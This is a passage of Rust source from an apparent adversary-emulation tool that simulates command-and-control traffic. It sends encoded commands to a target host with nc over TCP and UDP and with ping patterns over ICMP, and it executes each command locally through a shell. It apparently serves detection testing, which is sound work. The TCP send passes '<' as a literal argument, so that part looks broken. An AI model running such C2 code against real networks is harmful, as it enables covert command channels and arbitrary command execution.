                .filter(|line| !line.starts_with('#') && !line.is_empty())
                .collect();
            
            // Simulate C2 communication based on protocol
            match protocol.to_lowercase().as_str() {
                "tcp" => {
                    writeln!(log_file_handle, "\n## TCP-based C2 - Actual Network Traffic").unwrap();
                    writeln!(log_file_handle, "Establishing TCP connection to {target}:{port}...").unwrap();
                    
                    // First check if port is actually open
                    let port_check = Command::new("nc")
                        .arg("-z")
                        .arg("-v")
                        .arg("-w")
                        .arg("1") // 1 second timeout
                        .arg(&target)
                        .arg(&port)
                        .output()
                        .await;
                        
                    let is_port_open = match port_check {
                        Ok(output) => output.status.code().unwrap_or(1) == 0,
                        Err(_) => false
                    };
                    
                    if is_port_open {
                        writeln!(log_file_handle, "Target port is open and accessible.").unwrap();
                    } else {
                        writeln!(log_file_handle, "Target port is closed or not accessible. Will attempt to send data anyway.").unwrap();
                    }
                    
                    let mut successful_commands = 0;
                    
                    // Use netcat to actually send data over TCP
                    writeln!(log_file_handle, "\nExecuting actual command transmission over TCP:").unwrap();
                    
                    for (i, cmd) in command_lines.iter().enumerate() {
                        // Encode command in base64 for transmission
                        let encoded_cmd = BASE64.encode(cmd);
                        
                        writeln!(log_file_handle, "[{}] Sending command: {}", i + 1, cmd).unwrap();
                        writeln!(log_file_handle, "    TX: {} bytes - {}", cmd.len(), encoded_cmd).unwrap();
                        
                        // Create a temporary file with the encoded command
                        let temp_file = format!("/tmp/signalbench_c2_tcp_cmd_{i}.tmp");
                        if let Err(e) = std::fs::write(&temp_file, &encoded_cmd) {
                            writeln!(log_file_handle, "    Failed to create temporary file: {e}").unwrap();
                            continue;
                        }
                        
                        // Use netcat to send the command to the target
                        let output = Command::new("timeout")
                            .arg("3")  // Timeout after 3 seconds
                            .arg("nc")
                            .arg(&target)
                            .arg(&port)
                            .arg("-w")
                            .arg("2")  // Wait 2 seconds for response
                            .arg("<")
                            .arg(&temp_file)
                            .output()
                            .await;
                            
                        // Clean up temp file
                        let _ = std::fs::remove_file(&temp_file);
                        
                        match output {
                            Ok(result) => {
                                let exit_status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Command Status: {exit_status}").unwrap();
                                
                                if !stdout.is_empty() {
                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                // Also execute the command locally to get a realistic response
                                let local_output = Command::new("sh")
                                    .arg("-c")
                                    .arg(cmd)
                                    .output()
                                    .await;
                                    
                                match local_output {
                                    Ok(local_result) => {
                                        let local_stdout = String::from_utf8_lossy(&local_result.stdout);
                                        if !local_stdout.is_empty() {
                                            let preview = if local_stdout.len() > 200 {
                                                format!("{}... (truncated)", &local_stdout[0..200])
                                            } else {
                                                local_stdout.to_string()
                                            };
                                            writeln!(log_file_handle, "    Local execution result: {preview}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "    Local execution failed: {e}").unwrap();
                                    }
                                }
                                
                                successful_commands += 1;
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    TCP transmission failed: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between commands
                        sleep(Duration::from_millis(300)).await;
                    }
                    
                    writeln!(log_file_handle, "\nC2 communication complete - {}/{} commands transmitted via actual TCP", 
                        successful_commands, command_lines.len()).unwrap();
                },
                "udp" => {
                    writeln!(log_file_handle, "\n## UDP-based C2 - Actual Network Traffic").unwrap();
                    
                    writeln!(log_file_handle, "Preparing UDP packets for C2 communication with {target}:{port}...").unwrap();
                    let mut successful_commands = 0;

                    for (i, cmd) in command_lines.iter().enumerate() {
                        // Encode command in base64 for transmission
                        let encoded_cmd = BASE64.encode(cmd);
                        
                        writeln!(log_file_handle, "[{}] Sending command via UDP: {}", i + 1, cmd).unwrap();
                        writeln!(log_file_handle, "    TX UDP Packet: {} bytes - {}", cmd.len(), encoded_cmd).unwrap();
                        
                        // Create a temporary file with the encoded command
                        let temp_file = format!("/tmp/signalbench_c2_udp_cmd_{i}.tmp");
                        if let Err(e) = std::fs::write(&temp_file, &encoded_cmd) {
                            writeln!(log_file_handle, "    Failed to create temporary file: {e}").unwrap();
                            continue;
                        }
                        
                        // Use netcat to actually send UDP packet
                        let output = Command::new("sh")
                            .arg("-c")
                            .arg(format!("cat {temp_file} | nc -u -w 1 {target} {port}"))
                            .output()
                            .await;
                            
                        // Clean up temp file
                        let _ = std::fs::remove_file(&temp_file);
                        
                        match output {
                            Ok(result) => {
                                let exit_status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Command Status: {exit_status}").unwrap();
                                
                                if !stdout.is_empty() {
                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                // Also execute the command locally to get a realistic response
                                let local_output = Command::new("sh")
                                    .arg("-c")
                                    .arg(cmd)
                                    .output()
                                    .await;
                                    
                                match local_output {
                                    Ok(local_result) => {
                                        let local_stdout = String::from_utf8_lossy(&local_result.stdout);
                                        if !local_stdout.is_empty() {
                                            let preview = if local_stdout.len() > 200 {
                                                format!("{}... (truncated)", &local_stdout[0..200])
                                            } else {
                                                local_stdout.to_string()
                                            };
                                            writeln!(log_file_handle, "    Local execution result: {preview}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "    Local execution failed: {e}").unwrap();
                                    }
                                }
                                
                                successful_commands += 1;
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    UDP transmission failed: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between packets to avoid flooding
                        sleep(Duration::from_millis(200)).await;
                    }
                    
                    writeln!(log_file_handle, "\nC2 communication complete - {}/{} commands transmitted via actual UDP packets", 
                        successful_commands, command_lines.len()).unwrap();
                },
                "icmp" => {
                    writeln!(log_file_handle, "\n## ICMP-based C2 - Actual Network Traffic").unwrap();
                    
                    writeln!(log_file_handle, "Sending ICMP packets for C2 communication with {target}...").unwrap();
                    let mut successful_commands = 0;
                    
                    for (i, cmd) in command_lines.iter().enumerate() {
                        // Encode command in hex for ICMP data section
                        let hex_cmd = hex::encode(cmd.as_bytes());
                        let trunc_hex = if hex_cmd.len() > 32 { 
                            // ICMP pattern is 16 bytes (32 hex characters) max
                            hex_cmd[0..32].to_string() 
                        } else { 
                            // Pad with zeros if needed
                            format!("{hex_cmd:0<32}")
                        };
                        
                        writeln!(log_file_handle, "[{}] Sending command via ICMP: {}", i + 1, cmd).unwrap();
                        writeln!(log_file_handle, "    TX ICMP Packet: {} bytes - pattern 0x{}", cmd.len(), trunc_hex).unwrap();
                        
                        // Actually send ICMP ping with data pattern
                        let output = Command::new("ping")
                            .arg("-c")
                            .arg("1")  // Send 1 packet
                            .arg("-p")  // Pattern to fill packet
                            .arg(&trunc_hex)
                            .arg(&target)
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let exit_status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Command Status: {exit_status}").unwrap();
                                
                                if exit_status == 0 {
                                    successful_commands += 1;
                                }
                                
                                if !stdout.is_empty() {
                                    let summary = if stdout.len() > 200 {
                                        format!("{}... (truncated)", &stdout[0..200])
                                    } else {
                                        stdout.to_string()
                                    };
                                    writeln!(log_file_handle, "    Response: {summary}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                // Also execute the command locally to get a realistic response
                                let local_output = Command::new("sh")
                                    .arg("-c")
                                    .arg(cmd)
                                    .output()
                                    .await;
                                    
                                match local_output {
                                    Ok(local_result) => {
                                        let local_stdout = String::from_utf8_lossy(&local_result.stdout);
                                        if !local_stdout.is_empty() {
                                            let preview = if local_stdout.len() > 200 {
                                                format!("{}... (truncated)", &local_stdout[0..200])
                                            } else {
                                                local_stdout.to_string()
                                            };
                                            writeln!(log_file_handle, "    Local execution result: {preview}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "    Local execution failed: {e}").unwrap();
                                    }
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    ICMP transmission failed: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between packets to avoid flooding
                        sleep(Duration::from_millis(300)).await;
                    }
                    
                    writeln!(log_file_handle, "\nC2 communication complete - {}/{} commands transmitted via actual ICMP packets", 
                        successful_commands, command_lines.len()).unwrap();
                },
                _ => {
                    writeln!(log_file_handle, "\n## ERROR: Unsupported protocol '{protocol}'").unwrap();
                    writeln!(log_file_handle, "Supported protocols: tcp, udp, icmp").unwrap();
                }
            }
            
            writeln!(log_file_handle, "\nC2 communication simulation complete.").unwrap();
            
            // Close log file
            drop(log_file_handle);
            
            info!("Non-application layer protocol C2 simulation complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Non-application layer protocol C2 simulation completed. Protocol: {protocol}, Logs: {log_file}"),
                artifacts: vec![log_file.to_string(), command_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    // Check if it's a directory
                    if Path::new(artifact).is_dir() {
                        if let Err(e) = std::fs::remove_dir_all(artifact) {
                            error!("Failed to remove directory {artifact}: {e}");
                        } else {
                            debug!("Removed directory: {artifact}");
                        }
                    } else if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}